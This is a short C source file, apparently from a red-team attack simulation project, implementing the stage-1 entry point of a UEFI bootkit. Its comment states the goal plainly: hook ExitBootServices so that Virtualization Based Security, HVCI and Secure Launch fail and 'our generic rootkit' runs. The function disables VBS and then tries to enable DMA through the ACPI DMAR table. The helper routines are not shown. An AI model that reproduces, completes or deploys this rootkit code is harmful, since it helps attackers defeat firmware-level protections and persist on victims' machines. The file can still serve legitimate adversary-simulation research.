/*!
 *
 * PREBOOT
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

#define PROG_NON		0
#define PROG_VBS_DISABLE	1
#define PROG_DMA_ENABLED	2

/*!
 *
 * Purpose:
 *
 * Inserts a hook into EFI_SYSTEM_TABLE->ExitBootServices and disables the creation
 * of Virtualization Based Security. As a result, VBS, HVCI, and Secure Launch will
 * fail to initialize and our generic rootkit will execute successfully.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI Entry_Stage1( _In_ EFI_SYSTEM_TABLE* SystemTable )
{
	UINT32		Prg = PROG_NON;

	/* Did we succeed?! */
	if ( VbsDisable( SystemTable ) == EFI_SUCCESS ) {
		/* Look for the ACPI DMAR Table */
		Prg = AcpiEnableDma( SystemTable ) == EFI_SUCCESS ? PROG_DMA_ENABLED : PROG_VBS_DISABLE;
	};

	/* Return the status */
	return Prg;
};
